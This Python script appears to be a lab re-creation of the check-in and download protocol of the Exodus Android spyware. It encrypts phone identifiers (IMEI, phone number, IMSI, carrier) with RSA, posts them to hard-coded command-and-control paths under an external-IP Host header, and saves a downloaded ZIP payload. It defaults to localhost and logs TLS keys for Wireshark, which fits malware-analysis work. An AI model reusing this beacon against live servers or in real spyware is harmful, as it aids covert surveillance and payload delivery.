#!/usr/bin/env python3
from __future__ import annotations

import argparse
import gzip
import os
import socket
import ssl
from pathlib import Path

from exodus_crypto import build_plaintext, load_staging_public_key, rsa_pkcs1_v1_5_encrypt

CHECKIN_PATH = "/eddd0317-2bdc-4140-86cb-0e8d7047b874"
DOWNLOAD_PATH = "/56e087c9-fc56-49bb-bbd0-4fafc4acd6e1"


def args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("--connect-host", default="127.0.0.1")
    p.add_argument("--connect-port", type=int, default=8443)
    p.add_argument("--host-header", default="54.71.249.137")
    p.add_argument("--package", default="it.promofferte")
    p.add_argument("--device-id", default="356938035643809")
    p.add_argument("--android-release", default="8.1.0")
    p.add_argument("--line1-number", default="+393331234567")
    p.add_argument("--subscriber-id", default="222101234567890")
    p.add_argument("--network-operator-name", default="Vodafone IT")
    p.add_argument("--network-type", default="13")
    p.add_argument("--sim-state", default="5")
    p.add_argument("--out-zip", default="downloaded_exodus_two_sim.zip")
    p.add_argument("--keylog-file", default=None, help="TLS secrets file for Wireshark; overrides SSLKEYLOGFILE")
    p.add_argument("--send-sni", action="store_true")
    return p.parse_args()


def ssl_context(keylog_file: str | None) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if hasattr(ssl, "TLSVersion"):
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    keylog = keylog_file or os.environ.get("SSLKEYLOGFILE")
    if keylog:
        if hasattr(ctx, "keylog_filename"):
            ctx.keylog_filename = keylog
            print(f"[client] TLS keylog enabled: {Path(keylog).resolve()}")
        else:
            print("[client] WARNING: Python ssl has no keylog_filename support")
    else:
        print("[client] TLS keylog disabled; Wireshark cannot decrypt this run")
    return ctx


def encrypted_body(a: argparse.Namespace) -> tuple[str, bytes]:
    _key_b64, _der, pub = load_staging_public_key()
    plain = build_plaintext(
        a.device_id,
        a.android_release,
        a.line1_number,
        a.subscriber_id,
        a.network_operator_name,
        a.network_type,
        a.sim_state,
    )
    body = rsa_pkcs1_v1_5_encrypt(plain.encode("utf-8"), pub)
    if len(body) != 256:
        raise RuntimeError(f"Expected 256-byte body, got {len(body)}")
    return plain, body


def send_post(sock: ssl.SSLSocket, path: str, body: bytes, user_agent: str, host: str) -> None:
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Host: {host}\r\n"
        "Connection: Keep-Alive\r\n"
        "Accept-Encoding: gzip\r\n"
        "\r\n"
    ).encode("ascii") + body
    sock.sendall(req)


def recv_headers(sock: ssl.SSLSocket) -> tuple[str, dict[str, str], bytes]:
    data = bytearray()
    while b"\r\n\r\n" not in data:
        data.extend(sock.recv(4096))
    cut = data.index(b"\r\n\r\n") + 4
    header = bytes(data[:cut]).decode("iso-8859-1")
    lines = header.split("\r\n")
    hdrs: dict[str, str] = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            hdrs[k.lower()] = v.strip()
    return lines[0], hdrs, bytes(data[cut:])


def read_chunked(sock: ssl.SSLSocket, initial: bytes) -> bytes:
    data = bytearray(initial)
    out = bytearray()
    while True:
        while b"\r\n" not in data:
            data.extend(sock.recv(4096))
        pos = data.index(b"\r\n")
        size = int(bytes(data[:pos]).split(b";", 1)[0], 16)
        del data[: pos + 2]
        if size == 0:
            return bytes(out)
        while len(data) < size + 2:
            data.extend(sock.recv(4096))
        out.extend(data[:size])
        del data[: size + 2]


def read_response(sock: ssl.SSLSocket) -> tuple[str, bytes]:
    status, headers, rest = recv_headers(sock)
    if headers.get("transfer-encoding", "").lower() == "chunked":
        body = read_chunked(sock, rest)
    else:
        wanted = int(headers.get("content-length", "0"))
        body = bytearray(rest)
        while len(body) < wanted:
            body.extend(sock.recv(4096))
        body = bytes(body[:wanted])
    if headers.get("content-encoding", "").lower() == "gzip":
        body = gzip.decompress(body)
    return status, body


def main() -> int:
    a = args()
    user_agent = f"{a.package}:{a.device_id}"
    plain, body1 = encrypted_body(a)
    _plain2, body2 = encrypted_body(a)
    print(f"[client] plaintext before RSA: {plain!r}")
    print(f"[client] User-Agent: {user_agent}")
    print("[client] RSA ciphertext length: 256 bytes")

    raw = socket.create_connection((a.connect_host, a.connect_port), timeout=15)
    sni = a.host_header if a.send_sni else None
    with ssl_context(a.keylog_file).wrap_socket(raw, server_hostname=sni) as tls:
        print(f"[client] TLS established: {tls.version()} {tls.cipher()}")
        send_post(tls, CHECKIN_PATH, body1, user_agent, a.host_header)
        status, body = read_response(tls)
        print(f"[client] {CHECKIN_PATH} -> {status}; body={body!r}")
        send_post(tls, DOWNLOAD_PATH, body2, user_agent, a.host_header)
        status, body = read_response(tls)
        print(f"[client] {DOWNLOAD_PATH} -> {status}; ZIP bytes={len(body)}")
    Path(a.out_zip).write_bytes(body)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
